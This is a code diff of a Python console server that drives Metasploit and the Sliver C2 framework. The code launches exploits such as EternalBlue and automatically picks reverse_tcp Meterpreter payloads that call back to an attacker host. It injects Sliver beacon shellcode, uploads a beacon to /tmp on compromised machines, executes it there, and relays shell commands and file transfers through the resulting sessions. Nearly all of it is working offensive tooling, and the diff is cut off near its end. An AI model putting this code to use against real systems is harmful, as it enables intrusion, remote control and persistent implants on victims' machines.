@@ -20,16 +20,42 @@ SLIVER_HOST = "10.1.1.2"
 SLIVER_PORT = 55552
 # Alex End
 
-server = None
-msfInstance = None
+# ────────────── globals ────────────────────────────────────────────────────────
+server        = None
+msfInstance   = None
+sliver_client = None
+# ───────────────────────────────────────────────────────────────────────────────
+ALWAYS_PROMPT_OPTS_EXPLOIT = {"RHOSTS", "RPORT", "USERNAME", "PASSWORD", "THREADS", "LHOST", "LPORT", "PAYLOAD"}
+ALWAYS_PROMPT_OPTS_AUXILIARY = {"RHOSTS", "RPORT", "USERNAME", "PASSWORD", "THREADS"}
 
+def start_session_monitor():
+    monitor_thread = threading.Thread(
+        target=monitor_meterpreter_sessions,
+        daemon=True
+    )
+    monitor_thread.start()
+
+def monitor_meterpreter_sessions():
+    """Prints new sessions continuously."""
+    if msfInstance is None:
+        return
+    print(f"{GREEN}[+] Starting session monitor{RESET}")
+    while True:
+        try:
+            for sid, sess in msfInstance.sessions.list.items():
+                print(f"{GREEN}[+] Meterpreter session {sid} detected "
+                      f"({sess['type']}){RESET}")
+        except Exception:
+            pass
+        time.sleep(5)          # keep CPU happy
+        
 def run_meterpreter_exploit(target_ip):
     """Execute a Meterpreter payload against the target."""
     if msfInstance is None:
         return f"{RED}[-] Not connected to Metasploit. Use 'connect' first.{RESET}"
 
     exploit = msfInstance.modules.use("exploit", "windows/smb/ms17_010_eternalblue")
-    if not exploit:
+    if exploit is None:
         return f"{RED}[!] Failed to load exploit module{RESET}"
 
     # Set parameters for the exploit
@@ -54,45 +80,6 @@ def generate_meterpreter_payload():
         print(f"{RED}[!] Failed to generate Meterpreter payload: {e}{RESET}")
         return None
 # Alex End
-
-def monitor_meterpreter_sessions():
-    """Continuously check for new sessions"""
-    if msfInstance is None:
-        return
-    
-    print(f"{GREEN}[+] Starting session monitor{RESET}")
-    while True:
-        try:
-            sessions = msfInstance.sessions.list
-            for sid, session in sessions.items():
-                print(f"{GREEN}[+] Meterpreter session {sid} detected ({session['type']}){RESET}")
-        time.sleep(5)  # Check every 5 seconds
-
-def interact_meterpreter(session_id, command):
-    """Send commands to an active Meterpreter session."""
-    if msfInstance is None:
-        return f"{RED}[-] Not connected to Metasploit.{RESET}"
-
-    session = msfInstance.sessions.session(session_id)
-    if not session:
-        return f"{RED}[!] Invalid session ID: {session_id}{RESET}"
-
-    # Session passing (msf > sliver)
-    # Alex New
-    if command == "transfer-sliver":
-        beacon_path = generate_beacon("5", "10", SLIVER_HOST, "linux", "amd64", "sliver_beacon", format="bin")
-        if not beacon_path:
-            return f"{RED}[-] Failed to generate Sliver beacon for handoff.{RESET}"
-        session.write(f"upload {beacon_path} /tmp/sliver_beacon")
-        session.run_with_output("shell chmod +x /tmp/sliver_beacon && /tmp/sliver_beacon &")
-        return f"{GREEN}[+] Handed off session {session_id} to Sliver{RESET}"
-    #else:
-    #    response = session.run_with_output(command)
-    #    return f"{GREEN}[+] Meterpreter Response:\n{response}{RESET}"
-    # Alex End
-
-    response = session.run_with_output(command)
-    return f"{GREEN}[+] Meterpreter Response:\n{response}{RESET}"
 
 def connect_to_msfserver(password, server, port, max_retries=10, retry_delay=2):
     print(f"{GREEN}=============== Starting Metasploit API ==============={RESET}")
@@ -169,15 +156,29 @@ def interact_meterpreter(session_id, command):
     if stype != "meterpreter":
         return f"{RED}[!] Session {session_id} is a {stype} session, not Meterpreter.{RESET}"
 
-    sess_obj = msfInstance.sessions.session(session_id)
+    session = msfInstance.sessions.session(session_id)
 
+    # Session passing (msf > sliver)
+    # Alex New
+    if command == "transfer-sliver":
+        beacon_path = generate_beacon("5", "10", SLIVER_HOST, "linux", "amd64", "sliver_beacon", format="bin")
+        if not beacon_path:
+            return f"{RED}[-] Failed to generate Sliver beacon for handoff.{RESET}"
+        session.write(f"upload {beacon_path} /tmp/sliver_beacon")
+        session.run_with_output("shell chmod +x /tmp/sliver_beacon && /tmp/sliver_beacon &")
+        return f"{GREEN}[+] Handed off session {session_id} to Sliver{RESET}"
+    #else:
+    #    response = session.run_with_output(command)
+    #    return f"{GREEN}[+] Meterpreter Response:\n{response}{RESET}"
+    # Alex End
+    
     if command.startswith("upload "):
         parts = command.split(maxsplit=2) 
         if len(parts) != 3:
             return f"{RED}Usage: meterpreter <id> upload <local_path> <remote_path>{RESET}"
         local_path, remote_path = parts[1], parts[2]
         try:
-            sess_obj.upload(local_path, remote_path)
+            session.upload(local_path, remote_path)
             return f"{GREEN}[+] Uploaded {local_path} to {remote_path}{RESET}"
         except Exception as e:
             return f"{RED}[!] Upload failed: {e}{RESET}"
@@ -188,24 +189,24 @@ def interact_meterpreter(session_id, command):
             return f"{RED}Usage: meterpreter <id> download <remote_path> <local_path>{RESET}"
         remote_path, local_path = parts[1], parts[2]
         try:
-            sess_obj.download(remote_path, local_path)
+            session.download(remote_path, local_path)
             return f"{GREEN}[+] Downloaded {remote_path} to {local_path}{RESET}"
         except Exception as e:
             return f"{RED}[!] Download failed: {e}{RESET}"
 
     elif command.strip() == "shell":
         try:
-            sess_obj.shell_write("\n")
+            session.shell_write("\n")
             time.sleep(1)
-            output = sess_obj.shell_read()
+            output = session.shell_read()
             return f"{GREEN}Shell opened. Enter commands directly:\n{output}{RESET}"
         except Exception as e:
             return f"{RED}[!] Failed to open shell: {e}{RESET}"
 
     else:
         try:
-            output = sess_obj.run_with_output(command)
-            return f"{GREEN}{output}{RESET}"
+            output = session.run_with_output(command)
+            return f"{GREEN}[+] Meterpreter Response:\n{output}{RESET}"
         except Exception as e:
             return f"{RED}[!] Error in Meterpreter command: {e}{RESET}"
 
@@ -262,45 +263,60 @@ def parse_param_value(opt_data, user_input):
         return int(user_input)
     return user_input
 
-def run_msf_exploit(mtype, mname, user_params, c2="metasploit"):
-    """Run the selected exploit with parameters, no extra prompting."""
-    
-    # Alex New
+#####################
+# Run msf exploit 
+#####################
+def run_msf_exploit(mtype, mname, user_params, c2="metasploit",action="exploit"):
     if msfInstance is None:
         return f"{RED}[-] Not connected to Metasploit.{RESET}"
-    # Alex End
-    
-    exploit = msfInstance.modules.use(mtype, mname)
-    if not exploit:
-        return f"{RED}[!] Could not load {mtype} module: {mname}{RESET}"
 
-    # Alex New
-    # BYOS: bring your own stager (msf > sliver)
+    try:
+        exploit = msfInstance.modules.use(mtype, mname)
+    except Exception as e:
+        return f"{RED}[!] Failed to load module: {str(e)}{RESET}"
+    
+    payload_name = None
+    # BYOS: bring your own stager (Sliver handoff)
     if c2 == "sliver":
-        # Generate Sliver shellcode
         beacon_path = generate_beacon("5", "0", SLIVER_HOST, "linux", "amd64", "sliver_beacon", format="shellcode")
         if not beacon_path:
             return f"{RED}[-] Failed to generate Sliver shellcode.{RESET}"
-        with open(beacon_path, "rb") as f:
-            shellcode = f.read()
-        exploit["PAYLOAD"] = "generic/custom"
-        exploit["CUSTOM_PAYLOAD"] = shellcode
-        exploit["LHOST"] = SLIVER_HOST
-        exploit["LPORT"] = SLIVER_PORT
+        try:
+            with open(beacon_path, "rb") as f:
+                shellcode = f.read()
+            exploit["PAYLOAD"] = "generic/custom"
+            exploit["CUSTOM_PAYLOAD"] = shellcode
+            exploit["LHOST"] = SLIVER_HOST
+            exploit["LPORT"] = SLIVER_PORT
+        except Exception as e:
+            return f"{RED}[!] Error setting shellcode payload: {e}{RESET}"
     else:
-        exploit["PAYLOAD"] = "linux/x64/meterpreter/reverse_tcp" # meterpreter for linux
-        exploit["LHOST"] = MSF_HOST
-        exploit["LPORT"] = 4444 # msf server port? check client.py
-    # Alex End
+        # ---------------- choose payload (only for 'exploit' action) -------------
+        if action == "exploit" and mtype == "exploit":
+            # choose meterpreter automatically if user omitted PAYLOAD
+            payload_name = user_params.get("PAYLOAD") or pick_meterpreter_payload(exploit)
+            try:
+                exploit.payload = payload_name
+            except Exception:
+                pass   # some modules ignore .payload assignment
+        
+    # ---------------- apply user‑supplied options ----------------------------
+    for k, v in user_params.items():
+        try:
+            if k in exploit.options:
+                exploit[k] = v
+        except Exception as e:
+            print(f"{YELLOW}[!] Failed to set option {k}: {e}{RESET}")
 
-    # Only set the user_params we collected in handle_message
-    for param_key, param_value in user_params.items():
-        exploit[param_key] = param_value
-
-    print(f"{GREEN}Running exploit: {mname}{RESET}")
-    result = exploit.execute()
-    print(f"{BLUE}Exploit Result: {result}{RESET}")
-    return result
+    # ---------------- run check or exploit -----------------------------------
+    try:
+        if action == "check":
+            chk = exploit.check() if callable(exploit.check) else exploit.check
+            return str(chk)
+        result = exploit.execute(payload=payload_name)
+        return json.dumps(result)
+    except Exception as e:
+        return f"{RED}[!] Exploit failed: {e}{RESET}"
 
 
 # Alex New
@@ -377,7 +393,7 @@ def generate_beacon(seconds, jitter, http, os, arch, beacon_name, format="bin"):
         print(chunk)
         if 'Implant saved to' in chunk:
             break
-    return 0
+    return output_file if 'Implant saved to' in output else None
 # Alex End
 
 #####################
@@ -395,49 +411,38 @@ def validate_module_type(module_type, module_name):
             return False, f"{RED}{module_name} is NOT an auxiliary. Try: run exploit {module_name}{RESET}"
     return True, None
 
-
-##############################
-# Run Exploit (skip "Invalid option 'PAYLOAD'")
-##############################
-##############################
-# Run the Exploit
-##############################
-def run_msf_exploit(mtype, mname, user_params):
-    if msfInstance is None:
-        return f"{RED}[-] Not connected to Metasploit.{RESET}"
-
+#####################
+# helper method for payloads 
+#####################
+def pick_meterpreter_payload(exploit_mod):
+    """
+    • First look for a reverse‑tcp Meterpreter in exploit_mod.compatible_payloads.
+    • If none, return the FIRST compatible payload Metasploit reports.
+    • If list is empty, fall back to a platform guess, then generic shell.
+    This guarantees we never return None.
+    """
     try:
-        mod = msfInstance.modules.use(mtype, mname)
-    except Exception as e:
-        return f"{RED}[!] Failed to load module: {str(e)}{RESET}"
+        for p in exploit_mod.compatible_payloads:
+            if "meterpreter" in p and "reverse_tcp" in p:
+                return p
+        # no meterpreter; take the first compatible payload if available
+        if exploit_mod.compatible_payloads:
+            return exploit_mod.compatible_payloads[0]
+    except Exception:
+        pass
 
-    # Payload validation for reverse shells
-    if mtype == "exploit" and "PAYLOAD" in user_params:
-        payload = user_params["PAYLOAD"]
-        if "reverse" in payload:
-            missing = [opt for opt in ["LHOST", "LPORT"] if opt not in user_params]
-            if missing:
-                return f"{RED}[!] Reverse payload requires: {', '.join(missing)}{RESET}"
+    # guess by platform path
+    path = exploit_mod.fullname.lower()
+    if "windows" in path:
+        return "windows/x64/meterpreter/reverse_tcp"
+    if "linux" in path:
+        return "linux/x64/meterpreter/reverse_tcp"
+    if "php" in path:
+        return "php/meterpreter/reverse_tcp"
+    if "java" in path:
+        return "java/meterpreter/reverse_tcp"
+    return "generic/shell_reverse_tcp"
 
-    try:
-        mod.payload = user_params.get("PAYLOAD", "")
-    except:
-        pass  # Fallback to manual option setting
-
-    required_options = ["RHOSTS", "LHOST", "LPORT"]
-    for opt in required_options:
-        if opt in mod.options and opt not in user_params:
-            return f"{RED}[!] Missing required option: {opt}{RESET}"
-
-    for k, v in user_params.items():
-        mod[k] = v
-
-    try:
-        result = mod.execute()
-        return json.dumps(result)
-    except Exception as e:
-        return f"{RED}[!] Exploit failed: {str(e)}{RESET}"
-    
 ##############################
 # Main Handler
 ##############################
@@ -445,410 +450,240 @@ def handle_message(data, client_address):
     global msfInstance
     print(f"{BLUE}[Server] Processing message: '{data}' from {client_address}{RESET}")
 
+    parts   = data.strip().split()
+    command = parts[0] if parts else ""
+    options = parts
+    
     # Track user state
     if not hasattr(handle_message, 'search_state'):
         handle_message.search_state = {}
-    client_state = handle_message.search_state.setdefault(client_address, 
-                                                          {'keyword': None, 'start': 0, 'in_search': False, 'in_run': False, 'run_module': None, 'beacon': False})
-
+    client_state = handle_message.search_state.setdefault(
+        client_address,
+        {
+            'keyword': None, 'start': 0,
+            'in_search': False, 'in_run': False,
+            'run_module': None, 'beacon': False
+        }
+    )
+    
+    # ------------------------------------------------------------------ create beacon
     if command == "create_beacon": 
         if len(options) < 9:
-            response = f"{RED}[!] Invalid Sliver Beacon Creation command: create_beacon [operator_name] [lhost] [seconds] [jitter] [http] [os] [arch] [beacon_name]{RESET}"
-        else:
-            response = f"{BLUE}[+] Creating Sliver Beacon...{RESET}"
-            beacon = create_sliver_beacon(options[1], options[2], options[3], options[4], options[5], options[6], options[7], options[8])
-            if beacon:
-                response = f"{BLUE}[+] Created Sliver Beacon!{RESET}"
-                client_state['beacon'] = True
-            else:
-                response = f"{RED}[!] Sliver beacon creation failed!{RESET}"
+            return (
+                f"{RED}[!] Invalid Sliver Beacon Creation command: "
+                f"create_beacon [operator_name] [lhost] [seconds] [jitter] "
+                f"[http] [os] [arch] [beacon_name]{RESET}"
+            )
+        beacon = create_sliver_beacon(
+            options[1], options[2], options[3], options[4],
+            options[5], options[6], options[7], options[8]
+        )
+        if beacon:
+            client_state['beacon'] = True
+            return f"{BLUE}[+] Created Sliver Beacon!{RESET}"
+        return f"{RED}[!] Sliver beacon creation failed!{RESET}"
 
-    elif command == "connect":
-        response = f"{BLUE}[+] Connecting to MSF...{RESET}"
+    # ------------------------------------------------------------------ connect
+    if command == "connect":
         msfInstance = connect_msf()
-        response = f"{BLUE}[+] Connected to Metasploit!{RESET}" if msfInstance else f"{RED}[-] Failed to connect to Metasploit{RESET}"
-        client_state['in_search'] = False  # Reset search state on connect
-        client_state['in_run'] = False
+        client_state.update({'in_search': False, 'in_run': False})
+        return (
+            f"{BLUE}[+] Connected to Metasploit!{RESET}"
+            if msfInstance else
+            f"{RED}[-] Failed to connect to Metasploit{RESET}"
+        )
     
-    elif command == "search":
+    # ------------------------------------------------------------------ search
+    if command == "search":
         if len(parts) < 3:
             return f"{RED}[!] Usage: search [exploits|auxiliary] <keyword> [start_index]{RESET}"
 
-        mod_type = parts[1].lower()
-        leftover = parts[2].split()
-        keyword = leftover[0]
-        start_idx = 0
-        if len(leftover) > 1 and leftover[-1].isdigit():
-            start_idx = int(leftover[-1])
-            keyword = ' '.join(leftover[:-1])
+        mod_type  = parts[1].lower()
+        keyword   = parts[2]
+        start_idx = int(parts[3]) if len(parts) > 3 and parts[3].isdigit() else 0
 
         if msfInstance is None:
             return f"{RED}[-] Not connected to Metasploit. Use 'connect' first.{RESET}"
 
         if mod_type == "exploits":
-            client_state['keyword'] = keyword
-            client_state['start'] = start_idx
-            client_state['in_search'] = True
+            client_state.update({'keyword': keyword, 'start': start_idx, 'in_search': True})
             results, total = search_exploit(keyword, start_idx)
             if results:
-                out = (
+                header = (
                     f"{BLUE}Exploit modules matching '{keyword}' "
-                    f"({start_idx}-{min(start_idx+20, total)} of {total}):\n{RESET}"
+                    f"({start_idx}-{min(start_idx+20, total)} of {total}):{RESET}"
                 )
-                out += "\n".join(results)
-                return out
-            else:
-                response = f"{RED}[!] Invalid module type. Use 'search exploits' or 'search auxiliary'{RESET}"
+                return header + "\n" + "\n".join(results)
+            return f"{BLUE}No matching exploit modules found.{RESET}"
+        return f"{RED}[!] Invalid module type. Use 'search exploits' or 'search auxiliary'{RESET}"
 
-    elif command == "run":
-        """
-        Simplified 'run' command that ONLY prompts for options in ALWAYS_PROMPT_OPTS 
-        and sets defaults for everything else (if available).
-        Skips any parameters outside this list, even if they have no default.
-        """
+    # ------------------------------------------------------------------ run (initial call + prompt cycle)
+    if command == "run" and not client_state.get("in_run"):
+        # ── FIRST INVOCATION ────────────────────────────────────────────
+        action = "exploit"
+        if len(options) > 3 and options[3].lower() == "check":
+            action = "check"
         if len(options) < 3:
-            response = f"{RED}[!] Invalid run command: run [exploit]/[auxiliary] [module_name]{RESET}"
-        else:
-            module_type = options[1]
-            module_name = options[2]
-            
-            # Alex New
-            c2_type = options[3] if len(options) > 3 else "metasploit"
-            # Alex End
-            
-            valid_ok, err_msg = validate_module_type(module_type, module_name)
-
-            if msfInstance is None:
-                response = f"{RED}[-] Not connected to Metasploit. Use 'connect' first.{RESET}"
-            elif not valid_ok:
-                response = err_msg
-            else:
-                exploit = msfInstance.modules.use(module_type, module_name)
-                if not exploit:
-                    response = f"{RED}[!] Could not load {module_type} module: {module_name}{RESET}"
-                else:
-                    ALWAYS_PROMPT_OPTS = {"RHOSTS", "RPORT", "USERNAME", "PASSWORD", "THREADS", "LHOST", "LPORT"}
-
-                    exploit_info = exploit._info.get('options', {})
-                    module_options = []
-
-                    # 1. For each known param, decide whether to prompt or to skip
-                    for opt_name, opt_data in exploit_info.items():
-                        default_val = opt_data.get('default', None)
-                        
-                        # If it's in our short list, we plan to prompt
-                        if opt_name in ALWAYS_PROMPT_OPTS:
-                            prompt_msg = f"Please enter {opt_name}"
-                            if default_val is not None:
-                                prompt_msg += f" (default: {default_val})"
-
-                            module_options.append({
-                                'name': opt_name,
-                                'default': default_val,
-                                'prompt': prompt_msg
-                            })
-                        else:
-                            # If there's a default, set it silently
-                            if default_val is not None:
-                                exploit[opt_name] = default_val
-                            # If it's required and no default is set, we do nothing—exploit might fail.
-
-                    # 2. Prepare the run state for prompting
-                    client_state['in_run'] = True
-                    client_state['exploit_options'] = module_options
-                    client_state['user_params'] = {}
-                    client_state['module_type'] = module_type
-                    client_state['module_name'] = module_name
-                    
-                    # Alex New
-                    client_state['c2'] = c2_type
-                    # Alex End
-
-                    # 3. If there are no prompts, just execute immediately
-                    if not module_options:
-                        result = exploit.execute()
-                        response = json.dumps(result)
-                        client_state['in_run'] = False
-                    else:
-                        response = f"{BLUE}{module_options[0]['prompt']}: {RESET}"
-
-    elif client_state['in_run']:
-        """
-        The user is responding to a previously asked param. 
-        We only prompt for the next param in ALWAYS_PROMPT_OPTS. 
-        """
-        exploit = msfInstance.modules.use(client_state['module_type'], client_state['module_name'])
-        if not exploit:
-            response = f"{RED}[!] Could not load {client_state['module_type']} module: {client_state['module_name']}{RESET}"
-            client_state['in_run'] = False
-            return response
-    
-        if not client_state['exploit_options']:
-            response = f"{RED}[!] No more options to fill.{RESET}"
-            client_state['in_run'] = False
-        else:
-            return f"{RED}[!] Invalid module type. Use 'search exploits' or 'search auxiliary'{RESET}"
-
-    ###################################
-    # next / prev / exit in search
-    ###################################
-    elif command in ["next","prev"] and client_state['in_search']:
-        if msfInstance is None:
-            return f"{RED}[-] Not connected to Metasploit.{RESET}"
-        if command == "next":
-            client_state['start'] += 20
-        else:
-            client_state['start'] -= 20
-        results, total = search_exploit(client_state['keyword'], client_state['start'])
-        if results:
-            out = (
-                f"{BLUE}Exploit modules matching '{client_state['keyword']}' "
-                f"({client_state['start']}-{min(client_state['start']+20, total)} of {total}):\n{RESET}"
-            )
-            out += "\n".join(results)
-            return out
-        else:
-            return f"{BLUE}No more exploit modules available.{RESET}"
-
-    elif command == "exit" and client_state['in_search']:
-        client_state['in_search'] = False
-        client_state['keyword'] = None
-        client_state['start'] = 0
-        return f"{BLUE}Returned to normal CLI.{RESET}"
-
-    ###################################
-    # run
-    ###################################
-    elif command == "run":
-        tokens = data.split()
-        if len(tokens) < 3:
             return f"{RED}[!] Usage: run [exploit|auxiliary] <module_name>{RESET}"
 
-        module_type = tokens[1].lower()
-        module_name = tokens[2]
-        ok, err_msg = validate_module_type(module_type, module_name)
+        module_type, module_name = options[1], options[2]
+        ok, err = validate_module_type(module_type, module_name)
         if not ok:
-            return err_msg
+            return err
+        if msfInstance is None:
+            return f"{RED}[-] Not connected to Metasploit. Use 'connect' first.{RESET}"
 
-        mod_obj = msfInstance.modules.use(module_type, module_name)
-        if not mod_obj:
-            return f"{RED}[!] Could not load {module_type} module: {module_name}{RESET}"
-
-        # For exploits => RHOSTS,RPORT,PAYLOAD,LHOST,LPORT
-        # For auxiliary => USERNAME,PASSWORD,RHOSTS,RPORT,THREADS
-        if module_type == "exploit":
-            ALWAYS_PROMPT_OPTS = ["RHOSTS","RPORT","PAYLOAD","LHOST","LPORT"]
-        else:
-            ALWAYS_PROMPT_OPTS = ["USERNAME","PASSWORD","RHOSTS","RPORT","THREADS"]
-
-        exploit_info = mod_obj._info.get("options", {})
-
-        # We'll do a 2-phase approach for exploit: ask RHOSTS,RPORT,PAYLOAD, then LHOST,LPORT
-        first_pass = []
-        second_pass = []
+        mod_obj  = msfInstance.modules.use(module_type, module_name)
+        prompts  = []
 
         if module_type == "exploit":
-            for o in ["RHOSTS","RPORT","PAYLOAD"]:
-                if o in exploit_info or o == "PAYLOAD":
-                    first_pass.append(o)
-            for o in ["LHOST","LPORT"]:
-                if o in exploit_info:
-                    second_pass.append(o)
-        else:
-            # For auxiliary
-            first_pass = ["RHOSTS","RPORT"]
-            second_pass = ["USERNAME","PASSWORD","THREADS"]
+            # ---- always ask PAYLOAD, LHOST, LPORT ----
+            default_pay = pick_meterpreter_payload(mod_obj) 
+            prompts.append({"name": "PAYLOAD","default": default_pay,
+                            "prompt": f"Please enter PAYLOAD (default: {default_pay})"})
+            prompts.append({"name": "LHOST","default": MSF_HOST,
+                            "prompt": f"Please enter LHOST (default: {MSF_HOST})"})
+            prompts.append({"name": "LPORT","default": 4444,
+                            "prompt": "Please enter LPORT (default: 4444)"})
+            for opt in ("SMBUser","SMBPass","RHOSTS","RPORT"):
+                if opt in mod_obj.options:
+                    info    = mod_obj._info["options"][opt]
+                    default = info.get("default")
+                    msg = f"Please enter {opt}" + (f" (default: {default})" if default is not None else "")
+                    prompts.append({"name": opt,"default": default,"prompt": msg})
 
-        final_list = []
-        # 1) first pass
-        for opt in first_pass:
-            od = exploit_info.get(opt, {"type":"string","default":None})
-            def_val = od.get("default", None)
-            pmpt = f"Please enter {opt}"
-            if def_val is not None:
-                pmpt += f" (default: {def_val})"
-            final_list.append({
-                "name": opt,
-                "default": def_val,
-                "prompt": pmpt
-            })
+        # build prompts for auxiliary modules
+        else:  # auxiliary
+            for opt in ("USERNAME","PASSWORD","RHOSTS","RPORT","THREADS"):
+                if opt in mod_obj.options:
+                    info    = mod_obj._info["options"][opt]
+                    default = info.get("default")
+                    msg = f"Please enter {opt}" + (f" (default: {default})" if default is not None else "")
+                    prompts.append({"name": opt,"default": default,"prompt": msg})
+        # ▲▲▲ END new code ▲▲▲
 
-        # 2) second pass
-        for opt in second_pass:
-            od = exploit_info.get(opt, {"type":"string","default":None})
-            def_val = od.get("default", None)
-            pmpt = f"Please enter {opt}"
-            if def_val is not None:
-                pmpt += f" (default: {def_val})"
-            final_list.append({
-                "name": opt,
-                "default": def_val,
-                "prompt": pmpt
-            })
+        # safety: if no prompts needed, execute immediately
+        if not prompts:
+            return run_msf_exploit(module_type, module_name, {})
 
-        if not final_list:
-            # No prompts => run immediately
-            res = mod_obj.execute()
-            return json.dumps(res)
-        else:
-            client_state['in_run'] = True
-            client_state['exploit_options'] = final_list
-            client_state['user_params'] = {}
-            client_state['module_type'] = module_type
-            client_state['module_name'] = module_name
-            return f"{BLUE}{final_list[0]['prompt']}: {RESET}"
+        client_state.update({
+            "in_run": True,
+            "prompt_queue": prompts,
+            "user_params": {},
+            "module_type": module_type,
+            "module_name": module_name,
+            "action": action
+        })
+        return f"{BLUE}{prompts[0]['prompt']}: {RESET}"
 
-    ###################################
-    # continuing the run (prompt cycle)
-    ###################################
-    elif client_state['in_run']:
-        mod_obj = msfInstance.modules.use(client_state['module_type'], client_state['module_name'])
-        if not mod_obj:
-            client_state['in_run'] = False
-            return f"{RED}[!] Could not load {client_state['module_type']} module: {client_state['module_name']}{RESET}"
+    elif client_state.get("in_run"):
+        # ── PROMPT CYCLE ────────────────────────────────────────────────
+        current = client_state["prompt_queue"].pop(0)
+        pname   = current["name"]
+        mod     = msfInstance.modules.use(client_state["module_type"],
+                                        client_state["module_name"])
+        opt_def = mod._info["options"].get(pname, {})
+        value   = parse_param_value(opt_def, data) or current.get("default")
+        client_state["user_params"][pname] = value
 
-        if not client_state['exploit_options']:
-            client_state['in_run'] = False
-            return f"{RED}[!] No more options to fill.{RESET}"
+        if not client_state["prompt_queue"]:        # all answers collected
+            client_state["in_run"] = False
+            return run_msf_exploit(
+                client_state["module_type"],
+                client_state["module_name"],
+                client_state["user_params"],
+                action=client_state["action"]
+            )
 
-        curr_opt = client_state['exploit_options'][0]
-        param_name = curr_opt['name']
-        user_input = data.strip()
+        nxt = client_state["prompt_queue"][0]
+        return f"{BLUE}{nxt['prompt']}: {RESET}"
 
-        fallback_opt = {"default": None, "type":"string"}
-        msfopt = mod_obj._info["options"].get(param_name, fallback_opt)
-        parsed_val = parse_param_value(msfopt, user_input)
-        client_state['user_params'][param_name] = parsed_val
-
-        # Check if the current parameter is PAYLOAD and we just set it
-        if param_name == "PAYLOAD" and parsed_val:
-            try:
-                payload_mod = msfInstance.modules.use('payload', parsed_val)
-                payload_option_details = payload_mod._info.get('options', {})  # Get list of option names
-                
-                for opt_name, opt_details in payload_option_details.items():
-                    if opt_details.get('required', False):
-                        if opt_name not in mod_obj.options and opt_name not in client_state['user_params']:
-                            prompt_msg = f"Please enter {opt_name}"
-                            if 'default' in opt_details:
-                                prompt_msg += f" (default: {opt_details['default']})"
-                            client_state['exploit_options'].insert(0, {
-                                "name": opt_name,
-                                "default": opt_details.get('default', None),
-                                "prompt": prompt_msg
-                            })
-            except Exception as e:
-                client_state['in_run'] = False
-                return f"{RED}[!] Error loading payload: {str(e)}{RESET}"
-
-        client_state['exploit_options'].pop(0)
-        if not client_state['exploit_options']:
-            # run exploit now
-            mtype = client_state['module_type']
-            mname = client_state['module_name']
-            params = client_state['user_params']
-            client_state['in_run'] = False
-            resp = run_msf_exploit(mtype, mname, params)
-            if isinstance(resp, str):
-                return resp
-            else:
-                return json.dumps(resp)
-        else:
-            nxt = client_state['exploit_options'][0]
-            return f"{BLUE}{nxt['prompt']}: {RESET}"
-
-    ###################################
-    # sessions
-    ###################################
-    elif command == "sessions":
+    # ------------------------------------------------------------------ next/prev/exit (search paging)
+    if command in ["next", "prev"] and client_state['in_search']:
         if msfInstance is None:
             return f"{RED}[-] Not connected to Metasploit.{RESET}"
-            
-        sessions = msfInstance.sessions.list  # Forces refresh
+        client_state['start'] += 20 if command == "next" else -20
+        results, total = search_exploit(client_state['keyword'], client_state['start'])
+        if results:
+            header = (
+                f"{BLUE}Exploit modules matching '{client_state['keyword']}' "
+                f"({client_state['start']}-{min(client_state['start']+20, total)} of {total}):{RESET}"
+            )
+            return header + "\n" + "\n".join(results)
+        return f"{BLUE}No more exploit modules available.{RESET}"
+    
+    if command == "exit" and client_state['in_search']:
+        client_state.update({'in_search': False, 'keyword': None, 'start': 0})
+        return f"{BLUE}Returned to normal CLI.{RESET}"
+    
+    # ------------------------------------------------------------------ sessions
+    if command == "sessions":
+        if msfInstance is None:
+            return f"{RED}[-] Not connected to Metasploit.{RESET}"
+        sessions = msfInstance.sessions.list   # refresh
         if not sessions:
             return f"{YELLOW}[!] No active sessions detected{RESET}"
-            
-        output = []
-        for sid, details in sessions.items():
-            session_info = (
+        lines = []
+        for sid, det in sessions.items():
+            lines.append(
                 f"Session {sid}:\n"
-                f"  Type: {details.get('type', 'unknown')}\n"
-                f"  Host: {details.get('session_host', 'unknown')}\n"
-                f"  Port: {details.get('session_port', 'unknown')}\n"
-                f"  Via: {details.get('via_exploit', 'unknown')}"
+                f"  Type: {det.get('type','?')}\n"
+                f"  Host: {det.get('session_host','?')}\n"
+                f"  Port: {det.get('session_port','?')}\n"
+                f"  Via : {det.get('via_exploit','?')}"
             )
-            output.append(session_info)
-            
-        return f"{GREEN}Active Sessions:\n{RESET}" + "\n\n".join(output)
+        return f"{GREEN}Active Sessions:\n{RESET}" + "\n\n".join(lines)
 
-    ###################################
-    # meterpreter
-    ###################################
-    elif command.startswith("meterpreter"):
+    # ------------------------------------------------------------------ meterpreter
+    if command.startswith("meterpreter"):
         parts = command.split(maxsplit=2)
         if len(parts) < 3:
-            response = f"{RED}Usage: meterpreter <session_id> <command>{RESET}"
-        else:
-            session_id, meterpreter_command = parts[1], parts[2]
-            try:
-                session = msfInstance.sessions.session(session_id)
-                output = session.run_with_output(meterpreter_command)
-                response = f"{GREEN}{output}{RESET}"
-            except KeyError:
-                response = f"{RED}Session ID {session_id} does not exist.{RESET}"
+            return f"{RED}Usage: meterpreter <session_id> <command>{RESET}"
+        session_id, meterpreter_command = parts[1], parts[2]
+        try:
+            session  = msfInstance.sessions.session(session_id)
+            output   = session.run_with_output(meterpreter_command)
+            return f"{GREEN}{output}{RESET}"
+        except KeyError:
+            return f"{RED}Session ID {session_id} does not exist.{RESET}"
     
-    # Alex New
-    elif command == "get-sliver-sessions":
+    # ------------------------------------------------------------------ sliver helpers
+    if command == "get-sliver-sessions":
         if sliver_client is None or not sliver_client.isalive():
-            response = f"{RED}[-] Sliver client not running.{RESET}"
-        else:
-            sliver_client.sendline("sessions")
-            time.sleep(2)
-            output = sliver_client.read_nonblocking(size=4096, timeout=2)
-            response = f"{GREEN}[+] Sliver Sessions:\n{output}{RESET}"
+            return f"{RED}[-] Sliver client not running.{RESET}"
+        sliver_client.sendline("sessions")
+        time.sleep(2)
+        output = sliver_client.read_nonblocking(size=4096, timeout=2)
+        return f"{GREEN}[+] Sliver Sessions:\n{output}{RESET}"
             
-    elif command.startswith("sliver"):
+    if command.startswith("sliver"):
         sections = data.split(maxsplit=2)
         if len(sections) < 3:
-            response = f"{RED}[!] Usage: sliver <session_id> <command>{RESET}"
-        else:
-            session_id, sliver_command = parts[1], parts[2]
-            response = interact_sliver(session_id, sliver_command)
-    # Alex End
+            return f"{RED}[!] Usage: sliver <session_id> <command>{RESET}"
+        session_id, sliver_cmd = sections[1], sections[2]
+        return interact_sliver(session_id, sliver_cmd)
     
-    elif command == "jobs":
+    # ------------------------------------------------------------------ jobs
+    if command == "jobs":
         if msfInstance is None:
             return f"{RED}[-] Not connected to Metasploit.{RESET}"
-        all_jobs = msfInstance.jobs.list
-        if all_jobs:
-            lines = []
-            for jid, jinfo in all_jobs.items():
